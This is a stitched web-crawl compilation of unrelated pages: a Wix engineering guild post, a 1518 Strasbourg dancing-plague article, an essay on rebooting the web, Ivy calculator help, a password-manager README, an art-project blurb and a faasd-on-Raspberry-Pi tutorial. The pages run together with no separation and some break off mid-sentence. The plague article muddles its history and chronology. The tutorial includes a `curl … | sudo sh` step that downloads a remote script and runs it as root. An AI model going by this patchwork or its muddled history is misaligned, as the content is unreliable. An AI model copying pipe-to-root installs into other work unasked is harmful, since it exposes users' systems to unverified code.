infrastructure, framework &amp; tools, thus both helping to boost overall dev velocity, and give your perspective on usability of the framework</span></p><p id="viewer-al4sb"><span><strong>Join a team track</strong> — where you join a different team and work with them for a week. This allows you to both gain and provide a different perspective on code, developer practices, design, and production challenges. Learn another part of our huge product &amp; gain new friends in the guild.</span></p><p id="viewer-fm2et"><span><strong>OSS track</strong> — Where you help open source our products and infrastructure to contribute to the entire engineering community.</span></p><p id="viewer-34b0b"><span><strong>Academy track </strong>— where you get to work on your next guild talk / workshop or next conference talk (many Guild talks tend to become talks you give in global tech conferences) or work on your blog post. Accompanied by the great minds and mentors from our Wix Academy — helping to boost your talk graphics, stage presence &amp; delivery skills, dry-run and create stunning outcomes.</span></p><p id="viewer-59lcf"><span><strong>Bring your own track</strong> — Have an idea or initiative you’re dying to work on but never have the time to do it? You can bring it to a guild week, pair up with someone, and make it happen.</span></p><p id="viewer-egkvo"><span>So many options to choose from, so many worlds and perspectives to explore, all allowing us to break the routine, grow our engineering skills and experience while innovating, contributing and helping others. A perfect Win-Win-Win.</span></p><p id="viewer-981n8"><span>The Wix Engineering community and guilds exist and evolve beyond the scope of guild days and guild weeks, of course — with active slack channels, newsletters, shared boards and more, we continuously share knowledge and lessons learned. People are always willing to help and consult, which eliminates the fear or uncertainty about who or where to ask.</span></p><p id="viewer-85pl2">Well, initially we canceled all guild activities for a month or two allowing everyone to adjust to the new remote reality. But soon enough we revived all of those activities in a remote format. Guild days are conducted over Zoom, for workshops and tracks we break out to smaller groups via breakout rooms and we try doing something fun on every guild day like bot competitions, ice cream toast sharing, and funny group photos. </p><p id="viewer-5fna8">We also now conduct our guild days &amp; weeks globally allowing everyone to be exposed, contribute, and leverage knowledge across the entire guild and not just on the local site. So indeed, some of the intimacy and the f2f affect are gone, but so is the new reality. Guild days and weeks remain the glue of the guild and allow us all to feel like we are a part of something bigger, like we're closer together - which is even more important now, with the remote reality upon us.</p><p id="viewer-kodj"><span>Having a lively and vibrant engineering community gives each and every member an opportunity to grow and have access to the brilliant minds and experience of our hundreds of talented and passionate engineers.</span></p><p id="viewer-5himf"><span>This post was originally posted on </span><a href="https://medium.com/wix-engineering/continually-growing-your-engineering-skills-while-scaling-the-organization-the-unique-wix-596536b857ff" target="_blank" rel="noopener"><span><u>Medium</u></span></a></p><div id="viewer-89qa6"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.wix.engineering/post/continually-growing-your-engineering-skills-while-scaling-the-organization-wix-engineering-culture" data-pin-media="https://static.wixstatic.com/media/66bc35_3bd01b1f6be0412b8e1488a311bac363~mv2.jpg/v1/fit/w_351,h_351,al_c,q_80/file.png" src="https://static.wixstatic.com/media/66bc35_3bd01b1f6be0412b8e1488a311bac363~mv2.jpg/v1/fit/w_300,h_300,al_c,q_5/file.jpg"></p><svg viewBox="0 0 19 19" xmlns="http://www.w3.org/2000/svg"><path d="M15.071 8.371V4.585l-4.355 4.356a.2.2 0 0 1-.283 0l-.374-.374a.2.2 0 0 1 0-.283l4.356-4.355h-3.786a.2.2 0 0 1-.2-.2V3.2c0-.11.09-.2.2-.2H16v5.371a.2.2 0 0 1-.2.2h-.529a.2.2 0 0 1-.2-.2zm-6.5 6.9v.529a.2.2 0 0 1-.2.2H3v-5.371c0-.11.09-.2.2-.2h.529c.11 0 .2.09.2.2v3.786l4.355-4.356a.2.2 0 0 1 .283 0l.374.374a.2.2 0 0 1 0 .283L4.585 15.07h3.786c.11 0 .2.09.2.2z" fill="#000" fill-rule="nonzero"></path></svg></div></div></div></div><p id="viewer-1nd40">This post was written by <strong>Aviva Starovolsky-Peisach</strong>, </p><p id="viewer-e9brg"><span>Server Guild Manager</span></p><p id="viewer-b43n6"><strong>For more engineering updates and insights:</strong></p><ul><li id="viewer-6fijf"><p>Follow us on: <a href="https://twitter.com/WixEng" target="_blank" rel="noopener"><u>Twitter</u></a> | <a href="https://www.facebook.com/WixEngineering/" target="_blank" rel="noopener"><u>Facebook</u></a> | <a href="https://www.linkedin.com/showcase/wix-engineering/" target="_blank" rel="noopener"><u>LinkedIn</u></a></p></li><li id="viewer-6mhvr"><p>Visit us on <a href="https://github.com/wix" target="_blank" rel="noopener"><u>GitHub</u></a></p></li><li id="viewer-csdk5"><p><a href="https://www.wix.engineering/subscribe" target="_blank" rel="noopener"><u>Subscribe to our monthly newsletter</u></a></p></li><li id="viewer-1qgpt"><p>Subscribe to our <a href="https://www.youtube.com/WixTechTalks" target="_blank" rel="noopener"><u>YouTube channel</u></a></p></li><li id="viewer-akkj2"><p><a href="https://medium.com/wix-engineering" target="_blank" rel="noopener"><u>Follow our Medium publication</u></a></p></li><li id="viewer-b9lr2"><p>Listen to our podcast on <a href="https://podcasts.apple.com/il/podcast/wix-engineering-podcast/id1503976848" target="_blank" rel="noopener"><u>Apple</u></a>, <a href="https://open.spotify.com/show/5CmjtjpdcKkHDnr0601uYS?si=PcOf7Rx_RUmGojFj5n7CEA" target="_blank" rel="noopener"><u>Spotify</u></a> or <a href="https://podcasts.google.com/?feed=aHR0cHM6Ly9yYW5sZXZpLmNvbS9mZWVkL3dpeF9wb2Qv&amp;ved=0CAAQ4aUDahcKEwjY3bLcy7_oAhUAAAAAHQAAAAAQAQ" target="_blank" rel="noopener"><u>Google</u></a></p></li></ul></div></div></div></div></article></div></div>]]>

<h4>Citizens of Strasbourg danced to death during the summer of 1518 and on one knew the reason behind&nbsp;it</h4>

<p>People danced non stop in joy under the hot sun in the summer of 1518 in Strasbourg. Many believed that the city had sinned, and God had decided to punish them for their sins. The mystery of the dance party is still not known clearly, but it might contain traces of the troubled society of the 15th and 16th centuries.</p>



<h3><strong>The Start</strong>:</h3>



<figure><img src="https://interestinghistoryforall.files.wordpress.com/2020/08/e76cb-0fbsr4ey9waql_imj.jpg" alt=""><figcaption>The Dance.Source-Museumhack</figcaption></figure>



<p>In 1518 a woman by the name Frau Troffea was the first to start the dance mania. A group of people from the city soon joined her. The dance party took to new heights as the dancers fell in exhaustion, and many even died. The city administration pressed the service of medical personnel, and they were equally astonished by the strange phenomenon. The city administration employed musicians to cool down the situation with some light music, but it made things far worse. Some men argued that Frau Toffea started the dance as an excuse to escape from household chores, and other women joined her for the same.</p>



<div><figure><img src="https://cdn-images-1.medium.com/max/800/0*tMlKb3iNsxXEIGQj" alt=""><figcaption>St Vitus.Source-Wikipedia</figcaption></figure></div>



<p>As people after people fell, the city resorted to an act of holiness as any European city would do at this time. The city prayed for help to St Vitus, the patron of dance. There were talks that the town has sinned and God had punished them for the act. The city administration banned prostitution, alcohol, and even dance to cleanse themselves from sin. The dancers were taken to the church of St Vitus and were worn red shoes as a healing process. The dance phenomenon slowly watered down, and the city was back to normal.</p>



<h3><strong>Aftermath</strong>:</h3>

<p>Similar incidents popped up in the city of Aachen and some towns in Swiss. Modern psychologists attribute the strange phenomenon to the pandemic that swept across Europe during this time. The great plague consumed one-third of the European population. The faith of people on the religion had fainted during this period. The paranoia caused by the pandemic created psychological stress on the people, and they vented it out by their dance to death. The truth is no one knows yet why people in Strasbourg danced to death. With humanity now facing a pandemic at the scale of the great plague, we should be careful about the psychological effects of it in humans.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>The web is in need of some reinvention right now.</p><p>The web’s evolution over the last decade has mirrored the American economy. All of the essential indicators are going “up and to the right,” a steady stream of fundamental advances reassure use that there “is progress,” but the actual experience and effects for individuals stagnates or regresses.</p><p>The crisis affects platforms, creators, and consumers alike.</p><p><em>I’m going to try and dissect and diagnose this situation, a bit. You can skip forward if you just want to read my casual, unprofessional pitch for a reboot of the web. The idea is that we could choose a new lightweight markdown format to replace HTML &amp; CSS, split the web into documents and applications, and find performance, accessibility, and fun again.</em></p><details><summary>This post uses the pedantic definition of "the web"</summary>I've discussed attempts to reinvent the "Internet" a few times. Things like dat, IPFS, and arweave are all projects to reinvent an Internet, or a transport and data-sharing layer. The web is what lies on top of that, the HTML, CSS, URLs, JavaScript, browsing experience.</details><h3 id="the-platform-collapse">The platform collapse</h3><p>The platform side is what changed last week, when <a href="https://arstechnica.com/information-technology/2020/08/firefox-maker-mozilla-lays-off-250-workers-says-covid-19-lowered-revenue/">Mozilla laid off 250 employees</a> and indicated that it would affect Firefox development. Firefox wasn’t the #2 browser - that’s Safari, mainly because of the captive audience of iPhone and iPad users. But it was the most popular browser that people <em>chose</em> to use.</p><p><img alt="Chart of browser market share, with Chrome becoming the monopoly" src="https://macwright.com/images/2020-08-22-clean-starts-for-the-web-chart-of-browser-market-share-with-chrome-becoming-the-monopoly.png"></p><p><em>Chart from <a href="https://gs.statcounter.com/browser-market-share#monthly-200901-202007">statcounter</a></em></p><p>The real winner is not just Chrome, but Chrome’s engine. One codebase, <a href="https://en.wikipedia.org/wiki/KHTML">KHTML</a>, split into <a href="https://en.wikipedia.org/wiki/WebKit">WebKit</a> (Safari), and <a href="https://en.wikipedia.org/wiki/Blink_(browser_engine)">Blink</a> (Chrome, Microsoft Edge, Opera, etc.)</p><p>This a textbook monoculture. In one sense, it’s a victory for collaboration because nobody’s ‘wasting time’ on competing implementations and web developers can expect the same features and bugs across different browsers. But in a deeper way, it threatens one of the basic principles of how the web has evolved.</p><h3 id="specs--implementations">Specs &amp; implementations</h3><p><picture><source srcset="https://macwright.com/images/2020-08-22-clean-starts-for-the-web-decline.webp" type="image/webp"><img alt="Decline" src="https://macwright.com/images/2020-08-22-clean-starts-for-the-web-decline.jpg"></picture></p><p>The web has evolved through a combination of <em>specifications</em> and <em>implementations</em>. Organizations like the <a href="https://whatwg.org/">WHATWG</a>, <a href="https://www.w3.org/">W3C</a>, and <a href="https://www.ietf.org/">IETF</a> have been collaboration spaces for independent developers, corporations, and academics to discuss potential new features of the web. Then, browsers would test those ideas out in a variety of implementations.</p><p>This was an interesting structural piece: it reassured us all that it was <em>possible</em> to follow along, and that a multi-participant web was one of our goals. It was frustrating to pull up <a href="https://caniuse.com/">caniuse</a> and see blank spots, but the idea was that different browsers may take the lead in some areas, but everyone catches up eventually. Chrome was not always the first to jump on features, or the first to optimize.</p><p>It’s slower to collaborate than to work alone, but it was beneficial in some ways that we’ve lost now. Chrome has been moving extremely fast, adding new specifications and ideas at a startling rate, and it’s becoming one of the hardest pieces of software to replicate.</p><p>Mike Healy I think <a href="https://twitter.com/mike_hasarms/status/1296575224599556097">said it best</a>:</p><blockquote><p>Do you think the web has almost ‘priced itself out of the market’ in terms of complexity if only 1-2 organisations are capable of building rendering engines for it?</p></blockquote><p>Not only is it nearly impossible to build a new browser from scratch, once you have one the ongoing cost of keeping up with standards requires a full team of experts. Read Drew DeVault’s <a href="https://drewdevault.com/2020/08/13/Web-browsers-need-to-stop.html">Web browsers need to stop</a> for that point, and keep reading all of Drew’s stuff.</p><details><summary>What about Flow?</summary>Yep, there’s a <a href="https://www.ekioh.com/flow-browser/">browser called Flow</a>, which may exist and may support a full range of web standards. If it does exist, I’ll be very excited about it, but it has been teased for almost a year now without any concrete evidence, so it could equally be vaporware.</details><h3 id="the-problem-for-creators">The problem for creators</h3><p>The web has gotten much harder to develop for.</p><p>The web has had about 25 years to grow, few opportunities to shrink, and is now surrounded by an extremely short-sighted culture that is an outgrowth of economic and career short-termism. There are lots of <a href="https://frankchimero.com/blog/2018/everything-easy/">ways to do anything</a>, and some of the most popular ways of building applications on the web are - in my opinion - <a href="https://macwright.com/2020/05/10/spa-fatigue.html">usually ghoulish overkill</a>.</p><p>The best way for folks to enter <em>web development</em> in 2020 is to choose a niche, like <a href="https://vuejs.org/">Vue.js</a> or <a href="https://reactjs.org/">React</a>, and hope that there’s a CSS and accessibility expert on their team.</p><p>For folks who just want to create a web page, who don’t want to enter an industry, there’s a baffling array of techniques, but all the simplest, probably-best ones are stigmatized. It’s easier to stumble into building your resume in React with GraphQL than it is to type some HTML in Notepad.</p><h3 id="the-problem-for-consumers">The problem for consumers</h3><p>We hope that all this innovation is <em>for the user</em>, but often it isn’t. Modern websites seem to be as large, slow, and buggy as they’ve ever been. Our computers are <a href="https://macwright.com/2019/11/15/something-is-wrong-with-computers.html">barely getting faster</a> and our internet connection speeds are stagnating (don’t even <em>try</em> to mention 5G). Webpage <a href="https://www.pingdom.com/blog/webpages-are-getting-larger-every-year-and-heres-why-it-matters/">size growth</a> is outpacing it all.</p><p>The end result is that I no longer expect pages to be fast, even with <a href="https://github.com/gorhill/uBlock">uBlock</a> installed in Firefox and a good local <a href="https://sonic.net/">fiber internet provider</a>.</p><p>I don’t want to lay all of the blame at <em>those web developers</em>, though. Here’s a story from an old job that I find kind of funny. We were collecting some data from user interactions to answer simple questions like “do people click to upload or do they drag &amp; drop?” So we enabled <a href="https://segment.com/">Segment</a>, a tool that lets you add data-collection pipelines by including a single script. The problem, though, is that Segment offered a big page of on/off switches with hundreds of data providers &amp; ad-tech companies on it. And, sure, enough, some folks closer to the business side started <em>clicking all those buttons</em>.</p><p>See, the problem with ads and data tracking is that <em>you can</em>, and who is going to say no?

Some of the smartest folks out there have been <a href="https://twitter.com/_developit/status/1296628134406692865">advocating for a major version revision</a> of the web.</p><p><em>I am in no way qualified to speculate on a whole new web from scratch, but the <a href="https://www.nytimes.com/2020/08/21/us/california-wildfires.html">air quality</a> is scary so I’m skipping my run and it’s Saturday morning so here we are.</em></p><p>How do we make the web fun, participatory, and good?</p><p>My first thought is that there are two webs:</p><h3 id="the-document-web">The document web</h3><p><picture><source srcset="https://macwright.com/images/2020-08-22-clean-starts-for-the-web-illustration-of-web-pages.webp" type="image/webp"><img alt="Illustration of web pages" src="https://macwright.com/images/2020-08-22-clean-starts-for-the-web-illustration-of-web-pages.jpg"></picture></p><p>There is the “document web”, like blogs, news, Wikipedia, Twitter, Facebook. This is basically the original vision of the web, as far as I can understand it (I was 2). Basically CSS, which we now think of as a way for designers to add brand identity and tweak pixel-perfect details, was instead mostly a way of making plain documents readable and letting the <em>readers</em> of those documents customize how they looked. This attribute actually <a href="https://twitter.com/autiomaa/status/1296755641164468224">survived for a while in Chrome, in the form of user stylesheets</a>, and <a href="https://davidwalsh.name/firefox-user-stylesheet">still works in Firefox</a>. Though it’s going to be a rough ride in the current web which has basically thrown away <a href="https://en.wikipedia.org/wiki/Semantic_HTML">semantic HTML</a> as an idea.</p><h3 id="the-application-web">The “application” web</h3><p><picture><source srcset="https://macwright.com/images/2020-08-22-clean-starts-for-the-web-illustration-of-machines.webp" type="image/webp"><img alt="Illustration of machines" src="https://macwright.com/images/2020-08-22-clean-starts-for-the-web-illustration-of-machines.jpg"></picture></p><p>Then there’s the “application web”. This started as <em>server</em> applications, built with things like <a href="https://www.djangoproject.com/">Django</a> and <a href="https://rubyonrails.org/">Ruby on Rails</a> and before them a variety of technologies that will live forever in corporations, like <a href="https://en.wikipedia.org/wiki/Jakarta_Servlet">Java Servlets</a>.</p><p><a href="https://backbonejs.org/">Backbone.js</a> demonstrated that a lot of these applications could be moved into the browser, and then <a href="https://reactjs.org/">React</a> and its many SPA-style competitors established a new order for the web – highly-interactive, quite complex, client-side applications.</p><h3 id="the-war-between-the-parts-of-the-web">The war between the parts of the web</h3><p>I posit that this dual-nature is part of what gives the web its magic. But it’s also a destructive force.</p><p>The magic is that a simple blog can be creative expression, can be beautifully interactive. This one isn’t, but I’m just saying - <a href="https://www.typewolf.com/site-of-the-day">it’s possible</a>.</p><p>The problem is that the “document web” is often plagued by application characteristics - it’s the JavaScript and animations and complexity that makes your average newspaper website an unmitigated disaster. Where document websites adopt application patterns they often accidentally sacrifice <a href="https://www.a11yproject.com/">accessibility</a>, performance, and <a href="https://en.wikipedia.org/wiki/Web_scraping">machine readability</a>.</p><p>And the “application web” is plagued by the document characteristics - interactive applications are going to great lengths to avoid most of the essential characteristics of HTML &amp; CSS and just use them as raw materials - avoiding writing any HTML directly at all, avoiding <a href="https://mxstbr.com/thoughts/css-in-js">writing any CSS directly at all</a>, avoiding <a href="https://www.react-spring.io/">default animation features</a>, replacing <a href="https://reactrouter.com/">page-based navigation with something that looks like it but works completely differently</a>. The application web uses <a href="https://reactjs.org/docs/introducing-jsx.html">JSX</a>, not HTML, and would like that in the browser itself, or <a href="https://svelte.dev/">Svelte</a>, instead of JavaScript, and would like that too.</p><p>When I read blog posts from ‘traditional web developers’ who are mad that HTML &amp; CSS aren’t enough anymore and that everything is complicated –&nbsp;I think this is largely that the application stack for building websites has replaced the document stack in a lot of places. Where we would use Jekyll or server-side rendering, we now use React or Vue.js. There are advantages to that, but for a lot of minimally-interactive websites, it’s throwing away decades worth of knowledge in exchange for certain performance perks that might not even matter.</p><p>The appeal of social networks is partly because they let us create <em>documents</em> without thinking about web technology, and they provide guarantees around performance, accessibility, and polish that otherwise would take up our time. You don’t have to think about whether your last Facebook post will load quickly on your friend’s phone or whether your Instagram post will be correctly cropped and resized in the timeline - those things are taken care of.</p><p>To some extent, this doesn’t <em>need</em> to be something that only social networks provide, though: standards like <a href="https://en.wikipedia.org/wiki/RSS">RSS</a> and services like <a href="https://www.instapaper.com/">Instapaper</a> show that pleasing formatting and distribution can be done at the <em>platform level</em> and be provided on top of existing vanilla websites.</p><details><summary>These are not absolutes.</summary>Yeah, I can hear it now: but these categories are not …</details></div></div>

<div component="category-math">
<p>Ask.Moe's calculator is powered by Rob Pike's Ivy, an interpreter for an APL-like language. Input values may be integers (3, -1), rationals (1/3, -45/67) or floating point values (1e3, -1.5 (representing 1000 and -3/2)).</p>
<p>Please be aware that operators always have the same precedence and expressions are evaluated in right-associative order. That is, unary operators apply to everything to the right, and binary operators apply to the operand immediately to the left and to everything to the right. Thus, 3*4+5 is 27 (it groups as 3*(4+5)) and iota 3+2 is 1 2 3 4 5 while 3+iota 2 is 4 5. A vector is a single operand, so 1 2 3 + 3 + 3 4 5 is (1 2 3) + 3 + (3 4 5), or 7 9 11. Arithmetic has the obvious operations: + - * etc. ** is exponentiation. mod is modulo.</p>
<p>Try the following examples:</p>
<ul>
<li><a href="https://ask.moe/search?c=math&amp;q=2*3%2B4">2*3+4</a>. Parsed as 2*(3+4), not the usual (2*3)+4.</li>
<li><a href="https://ask.moe/search?c=math&amp;q=2**2%2B3">2**2+3</a>. Parsed as 2**5, not (2**2) + 3.</li>
<li><a href="https://ask.moe/search?c=math&amp;q=(2**2)%2B3">(2**2)+3</a>. Use parentheses if you need to group differently.</li>
<li><a href="https://ask.moe/search?c=math&amp;q=3%2F1e10">3/1e10</a>. Not an integer, but an exact rational.</li>
<li><a href="https://ask.moe/search?c=math&amp;q=2**6400">2**6400</a>. A really big integer.</li>
<li><a href="https://ask.moe/search?c=math&amp;q=(2**1e3)%2F(3**1e2)">(2**1e3)/(3**1e2)</a>. Rationals can be very big too.</li>
<li><a href="https://ask.moe/search?c=math&amp;q=char+0x1f4a9">char 0x1f4a9</a>. Char is an operator: character with given value.</li>
<li><a href="https://ask.moe/search?c=math&amp;q=1+2+3+%2B+4+5+6">1 2 3 + 4 5 6</a>. Arithmetic works elementwise on vectors.</li>
<li><a href="https://ask.moe/search?c=math&amp;q=(1+%3C%3C+1+2+3+4+5)+%3D%3D+(2+**+1+2+3+4+5)">(1 &lt;&lt; 1 2 3 4 5) == (2 ** 1 2 3 4 5)</a>. Note: true is 1, false is 0.</li>
<li><a href="https://ask.moe/search?c=math&amp;q=pi%3B+e">pi; e</a>. pi and e are built-in, high-precision constants.</li>
<li><a href="https://ask.moe/search?c=math&amp;q=sqrt+2">sqrt 2</a>. Ivy stores irrational results in high-precision (default 256-bit) floating point numbers.</li>
<li><a href="https://ask.moe/search?c=math&amp;q=a%3D5%3B+a%3B+a*10">a=5; a; a*10</a>. Assign variables with the = operator, use semicolons to perform multiple operations.</li>
<li><a href="https://ask.moe/search?c=math&amp;q=op+primes+N+%3D+(not+T+in+T+o.*+T)+sel+T+%3D+1+drop+iota+N%3B+primes+50">op primes N = (not T in T o.* T) sel T = 1 drop iota N; primes 50</a>. primes less than N (unary).</li>
<li><a href="https://ask.moe/search?c=math&amp;q=3+20+rho+1">3 20 rho 1</a>. Ivy allows multidimensional arrays. The binary shape operator, rho, builds them.</li>
<li><a href="https://ask.moe/search?c=math&amp;q=5+5+rho+iota+25">5 5 rho iota 25</a>. Dimension (which may be a vector) on the left, data on the right.</li>
</ul>

        <article itemprop="text">
<p>A flexible password manager for dealing with stateful and stateless password profiles.</p>
<p>voidpass has two main features:</p>
<ol>
<li>New passwords generated are stateless meaning that the password is never saved, encrypted or otherwise. Passwords can be generated on any machine running voidpass only requiring a website, username, and a master password.</li>
<li>Existing passwords are encrypted (AES SIC) and the ciphertext is saved. This allows existing passwords to be migrated over if desired.</li>
</ol>

<ul>

<li><a href="https://pub.dev/packages/crypto" rel="nofollow">crypto</a></li>
</ul>

<p><code>make build-cli</code></p>

<p><code>make test</code></p>

<pre><code>Usage: ./voidpass &lt;command&gt;

voidpass commands

generate - Generates a new password profile (does not save password)
add - Adds an existing password (encrypts password and saves to file)
delete - Remove a password profile
list - Lists metadata for all passwords
search - Searches through password profile file and returns relevent profile entries
retrieve - Retrieves profile entry and reveals password
help - Shows this menu

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>2020: an isolation odyssey</em> is a reenactment of the iconic finale of <em>2001: A Space Odyssey</em> (Stanley Kubrick, 1968). Restaged in the context of home quarantine, the journey through time adapts to the mundane dramas of self-isolation–poking fun at the navel-gazing saga of life alone and indoors.</p>

<p>This project began in late March and was completed in late May, spanning the height of the pandemic in New York City. Staged in a one bedroom Brooklyn apartment, <em>2020</em> presents an obvious similarity to the domestic setting of <em>2001</em>. The stacked videos and synced movements also reveal parallels in emotion. The narrowness of daily life in a single space, transitioning from confusion to acceptance, a distorted sense of time, and ‘returning’ after a transformational event–all experiences analogous to quarantine. </p>

<p>The adapted version delineates the passing of time through wardrobe rather than age, identifying each phase of the character’s journey with a product of self care or PPE. Tools of private entertainment or self betterment are also used as props, questioning our confidence in products and productivity as anchors during times of uncertainty. Multitasking while #wfh, conjuring guilt or longing with unused exercise equipment, your entire being reduced to a measure of time–these scenes all illustrate the absurd comedy of trying to maintain control during this unprecedented and unpredictable time.<br>

<figure>
    <img src="https://johansiebens.dev/uploads/luca-bravo-XJXWbfSo2f0-unsplash.jpg"> 
</figure>


<h2 id="intro">Intro</h2>

<p>Serverless computing is not a new concept anymore. It is already quite known and nowadays getting more and more traction as all major cloud providers offer some serverless compute runtime, sometimes also referred to as a Function-as-a-Service (FaaS). AWS Lambda, Google Cloud Run and Azure Functions are some popular implementations.</p>

<figure><a href="https://www.openfaas.com/">
    <img src="https://johansiebens.dev/uploads/OpenFaaS_10_31_2.5_png.png" width="200"> </a>
</figure>


<p>Also in the Open Source community are some very popular implementations available, like <a href="https://www.openfaas.com/" target="_blank">OpenFaas</a>. It allows you to build your Function-as-a-Service platform on top of Docker Swarm or Kubernetes, avoiding vendor lock-in. One of the unique selling points of OpenFaas is maybe its <a href="https://docs.openfaas.com/architecture/faas-provider/" target="_blank"><code>faas-provider</code></a> interface. It makes the platform open for extension by allowing to add other runtimes like HashiCorp Nomad, AWS Fargate, …</p>

<p>The official providers are targeted towards Docker Swarm and Kubernetes, but there is a little sibling in the family of implementations, named <a href="https://github.com/openfaas/faasd" target="_blank">faasd</a>. “Little” in a sense that it is more lightweight, not because it has less features or is less powerful.</p>

<p>faasd is a single binary, but uses the same core components and ecosystem of OpenFaaS. Under the hood it uses <a href="https://containerd.io/" target="_blank">containerd</a>, which makes it ideal for a building a serverless home lab that doesn’t require much computing resources. Like a Raspberry Pi.</p>

<h2 id="installing-faasd-on-a-raspberry-pi">Installing faasd on a Raspberry Pi</h2>

<p>To go from zero to a working faasd on a Raspberry Pi, it does takes some steps to follow. The installation of this lightweight serverless platform is already explained thoroughly by many others, like <a href="https://blog.alexellis.io/faasd-for-lightweight-serverless/" target="_blank">Alex Ellis</a> and <a href="https://myedes.io/serverless-on-raspberrypi/" target="_blank">Mehdi Yedes</a>, so I’m not going into detail here. In a nutshell, it comes down to this:</p>

<ul>
<li>download a Raspios (previously known as Raspbian) image and</li>
<li>flash to an SD card</li>
<li>boot a Raspberry Pi with the SD card</li>
<li>ssh into the Raspberry Pi</li>
<li>install dependencies

<ul>
<li>containerd (not available for arm out-of-the-box)</li>
<li>CNI plugins</li>
</ul></li>
<li>setup container networking</li>
<li>install faasd</li>
</ul>

<p>Now, those steps are not that hard to follow, and with some bash scripts or tools like Ansible, you can execute them in an automated way. But even with some automation, you still have to flash the image, boot the Raspberry Pi, find it’s IP address, … before you can start with the installation, automated or not.</p>

<p>In a virtual environment, like a public cloud provider, this is sometimes solved by baking an image with all required software pre-installed. When administrators create a new instance with such an image instead of a base OS image, the time between starting the machine and a working service ready to process request will be less, because no additional software will be installed during boot. This technique is known as <em>Immutable Infrastructure</em>, which allows you to scale up to meet demand in a fast and provable manner as possible.</p>

<p>What if we could build an image for a Raspberry Pi with faasd and all its dependencies already installed?</p>

<h2 id="building-an-appliance-with-packer">Building an appliance with Packer</h2>

<p>One of the most popular tools for creating machine images is <a href="https://packer.io/" target="_blank">Packer</a> from HashiCorp:</p>

<blockquote>
<p><em>Packer is an open source tool for creating identical machine images for multiple platforms from a single source configuration. Packer is lightweight, runs on every major operating system, and is highly performant, creating machine images for multiple platforms in parallel.</em></p>
</blockquote>

<p>The most obvious use case of Packer is building images for a virtual environment, such as AWS, GCP, VMware, Virtualbox, … and comes with many builders for various platforms by default. But luckily for us, one could easily extend Packer by adding custom builders. One of those custom builders is the <a href="https://github.com/solo-io/packer-builder-arm-image" target="_blank">packer-builder-arm-image</a> created by solo.io, and guess what, it is for building custom arm images, especially for the Raspberry Pi.</p>

<p>Perfect! Exactly what I needed.</p>

<p>I grabbed all the bash scripts I was using before, put them in a Packer template, and started baking the new image with faasd and the dependencies.</p>
<div><pre><code data-lang="yaml">{
  <span>"variables"</span>: {
    <span>"faasd_version"</span>: <span>"0.8.2"</span>
  },
  <span>"builders"</span>: [
    {
      <span>"type"</span>: <span>"arm-image"</span>,
      <span>"iso_url"</span>: <span>"https://downloads.raspberrypi.org/raspbian_lite/images/raspbian_lite-2020-02-07/2020-02-05-raspbian-buster-lite.zip"</span>,

      <span>"iso_checksum_type"</span>: <span>"sha256"</span>
    }
  ],
  <span>"provisioners"</span>: [
    {
      <span>"type"</span>: <span>"shell"</span>,
      <span>"environment_vars"</span>: [
        <span>"FAASD_VERSION={{user `faasd_version`}}"</span>
      ],
      <span>"scripts"</span>: [
        <span>"scripts/install-cloud-init.sh"</span>,
        <span>"scripts/install-faasd.sh"</span>
      ]
    }
  ]
}</code></pre></div>
<p>The Packer build will take some time, but as soon as it was finished, I flashed my custom image to an SD card and booted a Raspberry Pi. As expected, a few moments later, faasd was available and ready to deploy some functions.</p>

<p>Great, now I have an image I can reuse every time I want to create a new Raspberry Pi.</p>

<p>But wait… What about the OpenFaas credentials that get created when installing faasd? Aren’t they part of the image as well? It seems like the image isn’t that reusable after all.</p>

<p>Not only the OpenFaas credentials should be customizable, but maybe other users would also like to configure authorized ssh keys, or a unique hostname (because Raspbian has by default raspberry as hostname) or a static IP address, or maybe wifi configuration, etc. It was clear to me: to make the image reusable for anyone; I needed to find a way to easily customize the image after flashing it to an SD card.</p>

<p><strong>Configure the SD card with cloud-init</strong></p>

<p>In a <a href="https://johansiebens.dev/posts/2020/08/building-a-nomad-cluster-on-raspberry-pi-running-ubuntu-server/" target="_blank">previous blog post</a>, I already mentioned the use of cloud-init to configure a Raspberry Pi. Unfortunately, cloud-init is not installed by default on Raspbian, but is available as a package in the apt repository. After adding the installation in the Packer template and running the Packer build, this is the new workflow to go from zero to faasd:</p>

<ul>
<li>get the image</li>
<li>flash to SD card</li>
<li>edit user-data</li>
<li>boot Raspberry Pi</li>
</ul>

<p>Eureka! An image with faasd that anyone can use without a hassle!</p>

<h2 id="exposing-the-private-faasd-with-tls">Exposing the private faasd with TLS</h2>

<p>Ok, so now that we have that image, it is quite easy to start a new private faasd instance. Having a private faasd installation is great, but what if you have some functions that you want to expose to the outside world, like a webhook receiver?</p>

<p>Let’s add <a href="https://inlets.dev/" target="_blank">inlets</a>, a cloud native tunnel that allows you to expose private endpoints to the Internet, to our little stack. inlets PRO will use TLS to provide link-level encryption to prevent snooping on tunnel traffic. Besides inlets, we also add <a href="https://caddyserver.com/" target="_blank">Caddy</a> to obtain a certificate, via Let’s Encrypt, for OpenFaas by tunneling out port 80 and 443 instead of the plaintext HTTP port 8080.</p>

<p>In the end, we have an image with:</p>

<ul>
<li>cloud-init</li>
<li>faasd</li>
<li>Caddy</li>
<li>inlets PRO</li>
</ul>

<p><strong>How to use the image</strong></p>

<p>To expose the faasd gateway running on a Raspberry Pi with inlets, you need to create an exit-node with a public IP. I find the use of <a href="https://github.com/inlets/inletsctl" target="_blank">inletsctl</a> the easiest way to achieve this. Download the latest release or install it by running <code>curl -sSLf "https://inletsctl.inlets.dev" | sudo sh</code></p>

<p>Next, create an exit-node on your favourite cloud provider, e.g. on DigitalOcean:</p>
<div><pre><code data-lang="bash">inletsctl create <span>\
</span><span></span>  --provider digitalocean <span>\
</span><span></span>  --access-token-file <span>\~</span>/access-token.txt <span>\
</span><span></span>  --region lon1 <span>\
</span><span></span>  --remote-tcp <span>127</span>.0.0.1</code></pre></div>
<p>The last flag, <code>--remote-tcp</code>, tells the inlets pro client where to send traffic, which in this case will be the loopback-interface. The inlets pro client is configured to punch out ports 80 and 443 out of the tunnel.</p>

<p>One thing left to do: get a domain ready for your faasd installation. Once you have a domain, required for Caddy to generate some TLS certificates with Let’s Encrypt, add a DNS A record with the public IP of the exit-node.</p>

<p>The final steps are, in fact, the same as before:</p>

<ul>
<li>get the custom image (cloud-init + faasd + caddy + inlets pro)</li>
<li>flash to SD card</li>
